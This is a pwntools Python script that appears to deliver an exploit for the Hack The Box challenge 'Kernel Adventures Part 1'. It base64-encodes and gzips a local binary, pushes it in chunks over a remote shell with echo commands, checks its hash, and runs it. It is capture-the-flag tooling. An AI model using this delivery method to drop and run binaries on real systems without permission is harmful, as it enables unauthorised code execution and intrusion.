import argparse
import functools
import gzip
import pathlib

from pwn import *

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

parser = argparse.ArgumentParser(prog="deliverer",
                                 description="Exploit delivery script for HTB Kernel Adventures Part 1.")
parser.add_argument("exploit_file", type=str)
parser.add_argument("ip_address", type=str)
parser.add_argument("port", type=int)
args = parser.parse_args()

io = remote(args.ip_address, args.port)


def send_command(command: bytes,
                 print_command=True,
                 print_result=True) -> bytes:
    if print_command:
        info(f"Sending command '{command.decode('ascii')}'")

    io.sendline(command)

    result = io.recvuntil(b"$ ")
    result = result[:result.rfind(b"\n")][len(command) + 2:]

    if result != b"" and print_result:
        info(result.decode('ascii'))

    return result


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Wait for initial prompt
io.recvuntil(b"$ ")

# Delivery script
send_command(b"cd /home/user", print_result=False)
send_command(b"rm -f exploit exploit.b64", print_result=False)
send_command(b"touch exploit.b64", print_result=False)

exploit_path = pathlib.Path(args.exploit_file).resolve()
compressed_exploit_path = exploit_path.with_suffix(".gz")

# Get hash of local exploit binary
sha256 = hashlib.sha256()
with open(exploit_path, 'rb', buffering=0) as exploit_file:
    for data in iter(functools.partial(exploit_file.read, 1024), b''):
        sha256.update(data)
local_exploit_hash = sha256.hexdigest()

# Compress the exploit file for network transfer
with open(exploit_path, 'rb') as exploit_file, gzip.open(compressed_exploit_path, 'wb') as compressed_exploit_file:
    compressed_exploit_file.writelines(exploit_file)

# Base64 encode and transfer the file
info("Transferring binary...")
with open(compressed_exploit_path, "rb") as compressed_exploit_file:
    for data in iter(functools.partial(compressed_exploit_file.read, 510), b''):
        encoded_data: str = base64.b64encode(data).decode("ascii")
        send_command(f"echo {encoded_data} >> exploit.b64".encode("ascii"),
                     print_command=False,
                     print_result=False)

# Remove compressed binary
os.remove(compressed_exploit_path)

# Prepare exploit for execution
send_command(b"base64 -d exploit.b64 > exploit.gz")
send_command(b"gzip -d exploit.gz")
send_command(b"chmod +x exploit")

# Confirm binary was transferred correctly
remote_exploit_hash_raw = send_command(b"sha256sum exploit", print_result=False)
remote_exploit_hash = remote_exploit_hash_raw.decode("ascii").split(" ")[0]
if remote_exploit_hash != local_exploit_hash:
    error("Remote exploit was not transferred correctly.")
    exit(1)

# Execute exploit
io.sendline(b"./exploit")

io.interactive()
